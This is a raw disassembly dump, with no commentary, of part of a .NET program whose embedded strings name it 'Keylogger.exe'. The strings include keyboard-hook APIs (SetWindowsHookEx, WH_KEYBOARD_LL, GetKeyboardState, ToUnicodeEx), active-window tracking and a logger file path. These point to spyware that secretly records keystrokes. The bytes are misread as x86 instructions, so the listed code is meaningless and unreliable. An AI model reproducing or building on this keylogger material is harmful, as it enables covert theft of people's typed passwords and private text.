  4025dd:	7e 09                	jle    0x4025e8
  4025df:	00 00                	add    %al,(%eax)
  4025e1:	04 2a                	add    $0x2a,%al
  4025e3:	00 1e                	add    %bl,(%esi)
  4025e5:	02 80 09 00 00 04    	add    0x4000009(%eax),%al
  4025eb:	2a 1a                	sub    (%edx),%bl
  4025ed:	7e 0a                	jle    0x4025f9
  4025ef:	00 00                	add    %al,(%eax)
  4025f1:	04 2a                	add    $0x2a,%al
  4025f3:	00 1e                	add    %bl,(%esi)
  4025f5:	02 28                	add    (%eax),%ch
  4025f7:	1c 00                	sbb    $0x0,%al
  4025f9:	00 0a                	add    %cl,(%edx)
  4025fb:	2a 56 73             	sub    0x73(%esi),%dl
  4025fe:	17                   	pop    %ss
  4025ff:	00 00                	add    %al,(%eax)
  402601:	06                   	push   %es
  402602:	28 1d 00 00 0a 74    	sub    %bl,0x740a0000
  402608:	04 00                	add    $0x0,%al
  40260a:	00 02                	add    %al,(%edx)
  40260c:	80 0a 00             	orb    $0x0,(%edx)
  40260f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402612:	00 00                	add    %al,(%eax)
  402614:	13 30                	adc    (%eax),%esi
  402616:	05 00 32 00 00       	add    $0x3200,%eax
  40261b:	00 05 00 00 11 02    	add    %al,0x2110000
  402621:	39 2a                	cmp    %ebp,(%edx)
  402623:	00 00                	add    %al,(%eax)
  402625:	00 20                	add    %ah,(%eax)
  402627:	c5 9d 1c 81 0a 16    	lds    0x160a811c(%ebp),%ebx
  40262d:	0b 38                	or     (%eax),%edi
  40262f:	14 00                	adc    $0x0,%al
  402631:	00 00                	add    %al,(%eax)
  402633:	02 07                	add    (%edi),%al
  402635:	6f                   	outsl  %ds:(%esi),(%dx)
  402636:	1e                   	push   %ds
  402637:	00 00                	add    %al,(%eax)
  402639:	0a 06                	or     (%esi),%al
  40263b:	61                   	popa
  40263c:	20 93 01 00 01 5a    	and    %dl,0x5a010001(%ebx)
  402642:	0a 07                	or     (%edi),%al
  402644:	17                   	pop    %ss
  402645:	58                   	pop    %eax
  402646:	0b 07                	or     (%edi),%eax
  402648:	02 6f 1f             	add    0x1f(%edi),%ch
  40264b:	00 00                	add    %al,(%eax)
  40264d:	0a 32                	or     (%edx),%dh
  40264f:	e3 06                	jecxz  0x402657
  402651:	2a 00                	sub    (%eax),%al
  402653:	00 01                	add    %al,(%ecx)
  402655:	04 00                	add    $0x0,%al
  402657:	00 b4 00 00 00 ce ca 	add    %dh,-0x35320000(%eax,%eax,1)
  40265e:	ef                   	out    %eax,(%dx)
  40265f:	be 01 00 00 00       	mov    $0x1,%esi
  402664:	91                   	xchg   %eax,%ecx
  402665:	00 00                	add    %al,(%eax)
  402667:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  40266b:	73 74                	jae    0x4026e1
  40266d:	65 6d                	gs insl (%dx),%es:(%edi)
  40266f:	2e 52                	cs push %edx
  402671:	65 73 6f             	gs jae 0x4026e3
  402674:	75 72                	jne    0x4026e8
  402676:	63 65 73             	arpl   %esp,0x73(%ebp)
  402679:	2e 52                	cs push %edx
  40267b:	65 73 6f             	gs jae 0x4026ed
  40267e:	75 72                	jne    0x4026f2
  402680:	63 65 52             	arpl   %esp,0x52(%ebp)
  402683:	65 61                	gs popa
  402685:	64 65 72 2c          	fs gs jb 0x4026b5
  402689:	20 6d 73             	and    %ch,0x73(%ebp)
  40268c:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40268f:	6c                   	insb   (%dx),%es:(%edi)
  402690:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  402697:	73 69                	jae    0x402702
  402699:	6f                   	outsl  %ds:(%esi),(%dx)
  40269a:	6e                   	outsb  %ds:(%esi),(%dx)
  40269b:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  4026a0:	30 2e                	xor    %ch,(%esi)
  4026a2:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  4026a5:	43                   	inc    %ebx
  4026a6:	75 6c                	jne    0x402714
  4026a8:	74 75                	je     0x40271f
  4026aa:	72 65                	jb     0x402711
  4026ac:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  4026b1:	72 61                	jb     0x402714
  4026b3:	6c                   	insb   (%dx),%es:(%edi)
  4026b4:	2c 20                	sub    $0x20,%al
  4026b6:	50                   	push   %eax
  4026b7:	75 62                	jne    0x40271b
  4026b9:	6c                   	insb   (%dx),%es:(%edi)
  4026ba:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  4026c1:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  4026c5:	62 37                	bound  %esi,(%edi)
  4026c7:	37                   	aaa
  4026c8:	61                   	popa
  4026c9:	35 63 35 36 31       	xor    $0x31363563,%eax
  4026ce:	39 33                	cmp    %esi,(%ebx)
  4026d0:	34 65                	xor    $0x65,%al
  4026d2:	30 38                	xor    %bh,(%eax)
  4026d4:	39 23                	cmp    %esp,(%ebx)
  4026d6:	53                   	push   %ebx
  4026d7:	79 73                	jns    0x40274c
  4026d9:	74 65                	je     0x402740
  4026db:	6d                   	insl   (%dx),%es:(%edi)
  4026dc:	2e 52                	cs push %edx
  4026de:	65 73 6f             	gs jae 0x402750
  4026e1:	75 72                	jne    0x402755
  4026e3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4026e6:	2e 52                	cs push %edx
  4026e8:	75 6e                	jne    0x402758
  4026ea:	74 69                	je     0x402755
  4026ec:	6d                   	insl   (%dx),%es:(%edi)
  4026ed:	65 52                	gs push %edx
  4026ef:	65 73 6f             	gs jae 0x402761
  4026f2:	75 72                	jne    0x402766
  4026f4:	63 65 53             	arpl   %esp,0x53(%ebp)
  4026f7:	65 74 02             	gs je  0x4026fc
	...
  402702:	00 00                	add    %al,(%eax)
  402704:	00 50 41             	add    %dl,0x41(%eax)
  402707:	44                   	inc    %esp
  402708:	50                   	push   %eax
  402709:	41                   	inc    %ecx
  40270a:	44                   	inc    %esp
  40270b:	50                   	push   %eax
  40270c:	b4 00                	mov    $0x0,%ah
  40270e:	00 00                	add    %al,(%eax)
  402710:	42                   	inc    %edx
  402711:	53                   	push   %ebx
  402712:	4a                   	dec    %edx
  402713:	42                   	inc    %edx
  402714:	01 00                	add    %eax,(%eax)
  402716:	01 00                	add    %eax,(%eax)
  402718:	00 00                	add    %al,(%eax)
  40271a:	00 00                	add    %al,(%eax)
  40271c:	0c 00                	or     $0x0,%al
  40271e:	00 00                	add    %al,(%eax)
  402720:	76 34                	jbe    0x402756
  402722:	2e 30 2e             	xor    %ch,%cs:(%esi)
  402725:	33 30                	xor    (%eax),%esi
  402727:	33 31                	xor    (%ecx),%esi
  402729:	39 00                	cmp    %eax,(%eax)
  40272b:	00 00                	add    %al,(%eax)
  40272d:	00 05 00 6c 00 00    	add    %al,0x6c00
  402733:	00 f4                	add    %dh,%ah
  402735:	08 00                	or     %al,(%eax)
  402737:	00 23                	add    %ah,(%ebx)
  402739:	53                   	push   %ebx
  40273a:	74 72                	je     0x4027ae
  40273c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  402743:	00 60 09             	add    %ah,0x9(%eax)
  402746:	00 00                	add    %al,(%eax)
  402748:	ec                   	in     (%dx),%al
  402749:	01 00                	add    %eax,(%eax)
  40274b:	00 23                	add    %ah,(%ebx)
  40274d:	55                   	push   %ebp
  40274e:	53                   	push   %ebx
  40274f:	00 4c 0b 00          	add    %cl,0x0(%ebx,%ecx,1)
  402753:	00 57 03             	add    %dl,0x3(%edi)
  402756:	00 00                	add    %al,(%eax)
  402758:	23 42 6c             	and    0x6c(%edx),%eax
  40275b:	6f                   	outsl  %ds:(%esi),(%dx)
  40275c:	62 00                	bound  %eax,(%eax)
  40275e:	00 00                	add    %al,(%eax)
  402760:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402761:	0e                   	push   %cs
  402762:	00 00                	add    %al,(%eax)
  402764:	10 00                	adc    %al,(%eax)
  402766:	00 00                	add    %al,(%eax)
  402768:	23 47 55             	and    0x55(%edi),%eax
  40276b:	49                   	dec    %ecx
  40276c:	44                   	inc    %esp
  40276d:	00 00                	add    %al,(%eax)
  40276f:	00 b4 0e 00 00 64 07 	add    %dh,0x7640000(%esi,%ecx,1)
  402776:	00 00                	add    %al,(%eax)
  402778:	23 7e 00             	and    0x0(%esi),%edi
  40277b:	00 00                	add    %al,(%eax)
  40277d:	53                   	push   %ebx
  40277e:	65 74 57             	gs je  0x4027d8
  402781:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  402788:	6f                   	outsl  %ds:(%esi),(%dx)
  402789:	6f                   	outsl  %ds:(%esi),(%dx)
  40278a:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  40278e:	55                   	push   %ebp
  40278f:	6e                   	outsb  %ds:(%esi),(%dx)
  402790:	68 6f 6f 6b 57       	push   $0x576b6f6f
  402795:	69 6e 64 6f 77 73 48 	imul   $0x4873776f,0x64(%esi),%ebp
  40279c:	6f                   	outsl  %ds:(%esi),(%dx)
  40279d:	6f                   	outsl  %ds:(%esi),(%dx)
  40279e:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4027a2:	43                   	inc    %ebx
  4027a3:	61                   	popa
  4027a4:	6c                   	insb   (%dx),%es:(%edi)
  4027a5:	6c                   	insb   (%dx),%es:(%edi)
  4027a6:	4e                   	dec    %esi
  4027a7:	65 78 74             	gs js  0x40281e
  4027aa:	48                   	dec    %eax
  4027ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ad:	6b 45 78 00          	imul   $0x0,0x78(%ebp),%eax
  4027b1:	47                   	inc    %edi
  4027b2:	65 74 4d             	gs je  0x402802
  4027b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b6:	64 75 6c             	fs jne 0x402825
  4027b9:	65 48                	gs dec %eax
  4027bb:	61                   	popa
  4027bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4027bd:	64 6c                	fs insb (%dx),%es:(%edi)
  4027bf:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4027c3:	74 46                	je     0x40280b
  4027c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c6:	72 65                	jb     0x40282d
  4027c8:	67 72 6f             	addr16 jb 0x40283a
  4027cb:	75 6e                	jne    0x40283b
  4027cd:	64 57                	fs push %edi
  4027cf:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  4027d6:	65 74 57             	gs je  0x402830
  4027d9:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  4027e0:	72 65                	jb     0x402847
  4027e2:	61                   	popa
  4027e3:	64 50                	fs push %eax
  4027e5:	72 6f                	jb     0x402856
  4027e7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4027ea:	73 49                	jae    0x402835
  4027ec:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  4027f0:	74 4b                	je     0x40283d
  4027f2:	65 79 53             	gs jns 0x402848
  4027f5:	74 61                	je     0x402858
  4027f7:	74 65                	je     0x40285e
  4027f9:	00 47 65             	add    %al,0x65(%edi)
  4027fc:	74 4b                	je     0x402849
  4027fe:	65 79 62             	gs jns 0x402863
  402801:	6f                   	outsl  %ds:(%esi),(%dx)
  402802:	61                   	popa
  402803:	72 64                	jb     0x402869
  402805:	53                   	push   %ebx
  402806:	74 61                	je     0x402869
  402808:	74 65                	je     0x40286f
  40280a:	00 47 65             	add    %al,0x65(%edi)
  40280d:	74 4b                	je     0x40285a
  40280f:	65 79 62             	gs jns 0x402874
  402812:	6f                   	outsl  %ds:(%esi),(%dx)
  402813:	61                   	popa
  402814:	72 64                	jb     0x40287a
  402816:	4c                   	dec    %esp
  402817:	61                   	popa
  402818:	79 6f                	jns    0x402889
  40281a:	75 74                	jne    0x402890
  40281c:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  402820:	6e                   	outsb  %ds:(%esi),(%dx)
  402821:	69 63 6f 64 65 45 78 	imul   $0x78456564,0x6f(%ebx),%esp
  402828:	00 4d 61             	add    %cl,0x61(%ebp)
  40282b:	70 56                	jo     0x402883
  40282d:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  402834:	65 79 00             	gs jns 0x402837
  402837:	4b                   	dec    %ebx
  402838:	65 79 6c             	gs jns 0x4028a7
  40283b:	6f                   	outsl  %ds:(%esi),(%dx)
  40283c:	67 67 65 72 00       	addr16 addr16 gs jb 0x402841
  402841:	41                   	inc    %ecx
  402842:	70 70                	jo     0x4028b4
  402844:	6c                   	insb   (%dx),%es:(%edi)
  402845:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40284c:	44                   	inc    %esp
  40284d:	61                   	popa
  40284e:	74 61                	je     0x4028b1
  402850:	00 6c 6f 67          	add    %ch,0x67(%edi,%ebp,2)
  402854:	67 65 72 50          	addr16 gs jb 0x4028a8
  402858:	61                   	popa
  402859:	74 68                	je     0x4028c3
  40285b:	00 43 75             	add    %al,0x75(%ebx)
  40285e:	72 72                	jb     0x4028d2
  402860:	65 6e                	outsb  %gs:(%esi),(%dx)
  402862:	74 41                	je     0x4028a5
  402864:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  402868:	65 57                	gs push %edi
  40286a:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  402871:	74 6c                	je     0x4028df
  402873:	65 00 57 4d          	add    %dl,%gs:0x4d(%edi)
  402877:	5f                   	pop    %edi
  402878:	4b                   	dec    %ebx
  402879:	45                   	inc    %ebp
  40287a:	59                   	pop    %ecx
  40287b:	44                   	inc    %esp
  40287c:	4f                   	dec    %edi
  40287d:	57                   	push   %edi
  40287e:	4e                   	dec    %esi
  40287f:	00 5f 70             	add    %bl,0x70(%edi)
  402882:	72 6f                	jb     0x4028f3
  402884:	63 00                	arpl   %eax,(%eax)
  402886:	5f                   	pop    %edi
  402887:	68 6f 6f 6b 49       	push   $0x496b6f6f
  40288c:	44                   	inc    %esp
  40288d:	00 57 48             	add    %dl,0x48(%edi)
  402890:	4b                   	dec    %ebx
  402891:	45                   	inc    %ebp
  402892:	59                   	pop    %ecx
  402893:	42                   	inc    %edx
  402894:	4f                   	dec    %edi
  402895:	41                   	inc    %ecx
  402896:	52                   	push   %edx
  402897:	44                   	inc    %esp
  402898:	4c                   	dec    %esp
  402899:	4c                   	dec    %esp
  40289a:	00 72 65             	add    %dh,0x65(%edx)
  40289d:	73 6f                	jae    0x40290e
  40289f:	75 72                	jne    0x402913
  4028a1:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  4028a4:	61                   	popa
  4028a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4028a6:	00 72 65             	add    %dh,0x65(%edx)
  4028a9:	73 6f                	jae    0x40291a
  4028ab:	75 72                	jne    0x40291f
  4028ad:	63 65 43             	arpl   %esp,0x43(%ebp)
  4028b0:	75 6c                	jne    0x40291e
  4028b2:	74 75                	je     0x402929
  4028b4:	72 65                	jb     0x40291b
  4028b6:	00 64 65 66          	add    %ah,0x66(%ebp,%eiz,2)
  4028ba:	61                   	popa
  4028bb:	75 6c                	jne    0x402929
  4028bd:	74 49                	je     0x402908
  4028bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4028c0:	73 74                	jae    0x402936
  4028c2:	61                   	popa
  4028c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4028c4:	63 65 00             	arpl   %esp,0x0(%ebp)
  4028c7:	4b                   	dec    %ebx
  4028c8:	65 79 6c             	gs jns 0x402937
  4028cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4028cc:	67 67 65 72 2e       	addr16 addr16 gs jb 0x4028ff
  4028d1:	50                   	push   %eax
  4028d2:	72 6f                	jb     0x402943
  4028d4:	70 65                	jo     0x40293b
  4028d6:	72 74                	jb     0x40294c
  4028d8:	69 65 73 2e 52 65 73 	imul   $0x7365522e,0x73(%ebp),%esp
  4028df:	6f                   	outsl  %ds:(%esi),(%dx)
  4028e0:	75 72                	jne    0x402954
  4028e2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4028e5:	2e 72 65             	jb,pn  0x40294d
  4028e8:	73 6f                	jae    0x402959
  4028ea:	75 72                	jne    0x40295e
  4028ec:	63 65 73             	arpl   %esp,0x73(%ebp)
  4028ef:	00 4d 61             	add    %cl,0x61(%ebp)
  4028f2:	69 6e 00 53 65 74 48 	imul   $0x48746553,0x0(%esi),%ebp
  4028f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4028fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4028fb:	6b 00 48             	imul   $0x48,(%eax),%eax
  4028fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ff:	6f                   	outsl  %ds:(%esi),(%dx)
  402900:	6b 43 61 6c          	imul   $0x6c,0x61(%ebx),%eax
  402904:	6c                   	insb   (%dx),%es:(%edi)
  402905:	62 61 63             	bound  %esp,0x63(%ecx)
  402908:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40290b:	65 79 62             	gs jns 0x402970
  40290e:	6f                   	outsl  %ds:(%esi),(%dx)
  40290f:	61                   	popa
  402910:	72 64                	jb     0x402976
  402912:	4c                   	dec    %esp
  402913:	61                   	popa
  402914:	79 6f                	jns    0x402985
  402916:	75 74                	jne    0x40298c
  402918:	00 47 65             	add    %al,0x65(%edi)
  40291b:	74 41                	je     0x40295e
  40291d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  402921:	65 57                	gs push %edi
  402923:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  40292a:	74 6c                	je     0x402998
  40292c:	65 00 2e             	add    %ch,%gs:(%esi)
  40292f:	63 63 74             	arpl   %esp,0x74(%ebx)
  402932:	6f                   	outsl  %ds:(%esi),(%dx)
  402933:	72 00                	jb     0x402935
  402935:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40293a:	00 67 65             	add    %ah,0x65(%edi)
  40293d:	74 5f                	je     0x40299e
  40293f:	52                   	push   %edx
  402940:	65 73 6f             	gs jae 0x4029b2
  402943:	75 72                	jne    0x4029b7
  402945:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  402948:	61                   	popa
  402949:	6e                   	outsb  %ds:(%esi),(%dx)
  40294a:	61                   	popa
  40294b:	67 65 72 00          	addr16 gs jb 0x40294f
  40294f:	67 65 74 5f          	addr16 gs je 0x4029b2
  402953:	43                   	inc    %ebx
  402954:	75 6c                	jne    0x4029c2
  402956:	74 75                	je     0x4029cd
  402958:	72 65                	jb     0x4029bf
  40295a:	00 73 65             	add    %dh,0x65(%ebx)
  40295d:	74 5f                	je     0x4029be
  40295f:	43                   	inc    %ebx
  402960:	75 6c                	jne    0x4029ce
  402962:	74 75                	je     0x4029d9
  402964:	72 65                	jb     0x4029cb
  402966:	00 67 65             	add    %ah,0x65(%edi)
  402969:	74 5f                	je     0x4029ca
  40296b:	44                   	inc    %esp
  40296c:	65 66 61             	gs popaw
  40296f:	75 6c                	jne    0x4029dd
  402971:	74 00                	je     0x402973
  402973:	43                   	inc    %ebx
  402974:	6f                   	outsl  %ds:(%esi),(%dx)
  402975:	6d                   	insl   (%dx),%es:(%edi)
  402976:	70 75                	jo     0x4029ed
  402978:	74 65                	je     0x4029df
  40297a:	53                   	push   %ebx
  40297b:	74 72                	je     0x4029ef
  40297d:	69 6e 67 48 61 73 68 	imul   $0x68736148,0x67(%esi),%ebp
  402984:	00 49 6e             	add    %cl,0x6e(%ecx)
  402987:	76 6f                	jbe    0x4029f8
  402989:	6b 65 00 42          	imul   $0x42,0x0(%ebp),%esp
  40298d:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  402994:	6f 6b 
  402996:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  40299a:	64 49                	fs dec %ecx
  40299c:	6e                   	outsb  %ds:(%esi),(%dx)
  40299d:	76 6f                	jbe    0x402a0e
  40299f:	6b 65 00 52          	imul   $0x52,0x0(%ebp),%esp
  4029a3:	75 6e                	jne    0x402a13
  4029a5:	00 47 65             	add    %al,0x65(%edi)
  4029a8:	74 43                	je     0x4029ed
  4029aa:	75 72                	jne    0x402a1e
  4029ac:	72 65                	jb     0x402a13
  4029ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4029af:	74 50                	je     0x402a01
  4029b1:	72 6f                	jb     0x402a22
  4029b3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4029b6:	73 00                	jae    0x4029b8
  4029b8:	67 65 74 5f          	addr16 gs je 0x402a1b
  4029bc:	50                   	push   %eax
  4029bd:	72 6f                	jb     0x402a2e
  4029bf:	63 65 73             	arpl   %esp,0x73(%ebp)
  4029c2:	73 4e                	jae    0x402a12
  4029c4:	61                   	popa
  4029c5:	6d                   	insl   (%dx),%es:(%edi)
  4029c6:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  4029cb:	70 6f                	jo     0x402a3c
  4029cd:	73 65                	jae    0x402a34
  4029cf:	00 6f 70             	add    %ch,0x70(%edi)
  4029d2:	5f                   	pop    %edi
  4029d3:	45                   	inc    %ebp
  4029d4:	78 70                	js     0x402a46
  4029d6:	6c                   	insb   (%dx),%es:(%edi)
  4029d7:	69 63 69 74 00 6f 70 	imul   $0x706f0074,0x69(%ebx),%esp
  4029de:	5f                   	pop    %edi
  4029df:	45                   	inc    %ebp
  4029e0:	71 75                	jno    0x402a57
  4029e2:	61                   	popa
  4029e3:	6c                   	insb   (%dx),%es:(%edi)
  4029e4:	69 74 79 00 52 65 61 	imul   $0x64616552,0x0(%ecx,%edi,2),%esi
  4029eb:	64 
  4029ec:	49                   	dec    %ecx
  4029ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4029ee:	74 33                	je     0x402a23
  4029f0:	32 00                	xor    (%eax),%al
  4029f2:	54                   	push   %esp
  4029f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f4:	55                   	push   %ebp
  4029f5:	70 70                	jo     0x402a67
  4029f7:	65 72 00             	gs jb  0x4029fa
  4029fa:	54                   	push   %esp
  4029fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4029fc:	4c                   	dec    %esp
  4029fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4029fe:	77 65                	ja     0x402a65
  402a00:	72 00                	jb     0x402a02
  402a02:	54                   	push   %esp
  402a03:	6f                   	outsl  %ds:(%esi),(%dx)
  402a04:	53                   	push   %ebx
  402a05:	74 72                	je     0x402a79
  402a07:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  402a0e:	63 61 74             	arpl   %esp,0x74(%ecx)
  402a11:	00 57 72             	add    %dl,0x72(%edi)
  402a14:	69 74 65 00 67 65 74 	imul   $0x5f746567,0x0(%ebp,%eiz,2),%esi
  402a1b:	5f 
  402a1c:	4e                   	dec    %esi
  402a1d:	65 77 4c             	gs ja  0x402a6c
  402a20:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  402a27:	74 65                	je     0x402a8e
  402a29:	4c                   	dec    %esp
  402a2a:	69 6e 65 00 47 65 74 	imul   $0x74654700,0x65(%esi),%ebp
  402a31:	50                   	push   %eax
  402a32:	72 6f                	jb     0x402aa3
  402a34:	63 65 73             	arpl   %esp,0x73(%ebp)
  402a37:	73 42                	jae    0x402a7b
  402a39:	79 49                	jns    0x402a84
  402a3b:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  402a3f:	74 5f                	je     0x402aa0
  402a41:	4d                   	dec    %ebp
  402a42:	61                   	popa
  402a43:	69 6e 57 69 6e 64 6f 	imul   $0x6f646e69,0x57(%esi),%ebp
  402a4a:	77 54                	ja     0x402aa0
  402a4c:	69 74 6c 65 00 49 73 	imul   $0x4e734900,0x65(%esp,%ebp,2),%esi
  402a53:	4e 
  402a54:	75 6c                	jne    0x402ac2
  402a56:	6c                   	insb   (%dx),%es:(%edi)
  402a57:	4f                   	dec    %edi
  402a58:	72 57                	jb     0x402ab1
  402a5a:	68 69 74 65 53       	push   $0x53657469
  402a5f:	70 61                	jo     0x402ac2
  402a61:	63 65 00             	arpl   %esp,0x0(%ebp)
  402a64:	47                   	inc    %edi
  402a65:	65 74 46             	gs je  0x402aae
  402a68:	6f                   	outsl  %ds:(%esi),(%dx)
  402a69:	6c                   	insb   (%dx),%es:(%edi)
  402a6a:	64 65 72 50          	fs gs jb 0x402abe
  402a6e:	61                   	popa
  402a6f:	74 68                	je     0x402ad9
  402a71:	00 5a 65             	add    %bl,0x65(%edx)
  402a74:	72 6f                	jb     0x402ae5
  402a76:	00 47 65             	add    %al,0x65(%edi)
  402a79:	74 54                	je     0x402acf
  402a7b:	79 70                	jns    0x402aed
  402a7d:	65 46                	gs inc %esi
  402a7f:	72 6f                	jb     0x402af0
  402a81:	6d                   	insl   (%dx),%es:(%edi)
  402a82:	48                   	dec    %eax
  402a83:	61                   	popa
  402a84:	6e                   	outsb  %ds:(%esi),(%dx)
  402a85:	64 6c                	fs insb (%dx),%es:(%edi)
  402a87:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402a8b:	74 5f                	je     0x402aec
  402a8d:	41                   	inc    %ecx
  402a8e:	73 73                	jae    0x402b03
  402a90:	65 6d                	gs insl (%dx),%es:(%edi)
  402a92:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402a96:	53                   	push   %ebx
  402a97:	79 6e                	jns    0x402b07
  402a99:	63 68 72             	arpl   %ebp,0x72(%eax)
  402a9c:	6f                   	outsl  %ds:(%esi),(%dx)
  402a9d:	6e                   	outsb  %ds:(%esi),(%dx)
  402a9e:	69 7a 65 64 00 67 65 	imul   $0x65670064,0x65(%edx),%edi
  402aa5:	74 5f                	je     0x402b06
  402aa7:	43                   	inc    %ebx
  402aa8:	68 61 72 73 00       	push   $0x737261
  402aad:	67 65 74 5f          	addr16 gs je 0x402b10
  402ab1:	4c                   	dec    %esp
  402ab2:	65 6e                	outsb  %gs:(%esi),(%dx)
  402ab4:	67 74 68             	addr16 je 0x402b1f
  402ab7:	00 4b 65             	add    %cl,0x65(%ebx)
  402aba:	79 6c                	jns    0x402b28
  402abc:	6f                   	outsl  %ds:(%esi),(%dx)
  402abd:	67 67 65 72 2e       	addr16 addr16 gs jb 0x402af0
  402ac2:	65 78 65             	gs js  0x402b2a
  402ac5:	00 75 73             	add    %dh,0x73(%ebp)
  402ac8:	65 72 33             	gs jb  0x402afe
  402acb:	32 2e                	xor    (%esi),%ch
  402acd:	64 6c                	fs insb (%dx),%es:(%edi)
  402acf:	6c                   	insb   (%dx),%es:(%edi)
  402ad0:	00 6b 65             	add    %ch,0x65(%ebx)
  402ad3:	72 6e                	jb     0x402b43
  402ad5:	65 6c                	gs insb (%dx),%es:(%edi)
  402ad7:	33 32                	xor    (%edx),%esi
  402ad9:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  402adc:	6c                   	insb   (%dx),%es:(%edi)
  402add:	00 70 72             	add    %dh,0x72(%eax)
  402ae0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ae1:	63 00                	arpl   %eax,(%eax)
  402ae3:	6e                   	outsb  %ds:(%esi),(%dx)
  402ae4:	43                   	inc    %ebx
  402ae5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ae6:	64 65 00 77 50       	fs add %dh,%gs:0x50(%edi)
  402aeb:	61                   	popa
  402aec:	72 61                	jb     0x402b4f
  402aee:	6d                   	insl   (%dx),%es:(%edi)
  402aef:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  402af3:	72 61                	jb     0x402b56
  402af5:	6d                   	insl   (%dx),%es:(%edi)
  402af6:	00 76 6b             	add    %dh,0x6b(%esi)
  402af9:	43                   	inc    %ebx
  402afa:	6f                   	outsl  %ds:(%esi),(%dx)
  402afb:	64 65 00 69 64       	fs add %ch,%gs:0x64(%ecx)
  402b00:	48                   	dec    %eax
  402b01:	6f                   	outsl  %ds:(%esi),(%dx)
  402b02:	6f                   	outsl  %ds:(%esi),(%dx)
  402b03:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  402b06:	70 66                	jo     0x402b6e
  402b08:	6e                   	outsb  %ds:(%esi),(%dx)
  402b09:	00 68 4d             	add    %ch,0x4d(%eax)
  402b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  402b0d:	64 00 64 77 54       	add    %ah,%fs:0x54(%edi,%esi,2)
  402b12:	68 72 65 61 64       	push   $0x64616572
  402b17:	49                   	dec    %ecx
  402b18:	64 00 68 68          	add    %ch,%fs:0x68(%eax)
  402b1c:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  402b1f:	70 4d                	jo     0x402b6e
  402b21:	6f                   	outsl  %ds:(%esi),(%dx)
  402b22:	64 75 6c             	fs jne 0x402b91
  402b25:	65 4e                	gs dec %esi
  402b27:	61                   	popa
  402b28:	6d                   	insl   (%dx),%es:(%edi)
  402b29:	65 00 68 57          	add    %ch,%gs:0x57(%eax)
  402b2d:	6e                   	outsb  %ds:(%esi),(%dx)
  402b2e:	64 00 6c 70 64       	add    %ch,%fs:0x64(%eax,%esi,2)
  402b33:	77 50                	ja     0x402b85
  402b35:	72 6f                	jb     0x402ba6
  402b37:	63 65 73             	arpl   %esp,0x73(%ebp)
  402b3a:	73 49                	jae    0x402b85
  402b3c:	64 00 6b 65          	add    %ch,%fs:0x65(%ebx)
  402b40:	79 43                	jns    0x402b85
  402b42:	6f                   	outsl  %ds:(%esi),(%dx)
